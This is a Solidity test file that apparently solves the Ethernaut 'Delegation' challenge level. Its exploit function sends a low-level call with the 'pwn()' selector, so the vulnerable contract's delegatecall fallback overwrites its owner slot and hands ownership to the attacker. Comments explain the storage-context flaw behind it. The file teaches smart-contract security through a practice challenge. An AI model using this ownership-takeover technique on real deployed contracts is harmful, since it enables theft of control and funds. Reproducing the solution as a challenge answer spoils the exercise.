// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Delegation.sol";
import "src/levels/DelegationFactory.sol";

contract TestDelegation is BaseTest {
    Delegation private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new DelegationFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Delegation(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.owner(), address(levelFactory));
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player);

        // Making a low level call to the delegation contract which will trigger the
        // fallback fn of the delegation contract. Fallback fn of delegation contract is delegating call
        // to the delegate contract with the received payload. The payload that we are sending is the
        // fn signature of the pwn fn of delegate contract which modifies the first storage slot/ owner variable.

        // When we make delegate call, the code of the target contract is executed in the context of the calling contract
        // which means that msg.sender, msg.value and storage doesn't change, only the code is taken from the target contract.

        // So when we call pwn fn of the delegate contract it modifies the storage of the Delegation contract
        // allowing us to become the new owner of the delegation contract
        (bool success, ) = address(level).call(abi.encodeWithSignature("pwn()"));
        require(success, "Transaction not successful");

        assertEq(level.owner(), player);

        vm.stopPrank();
    }
}
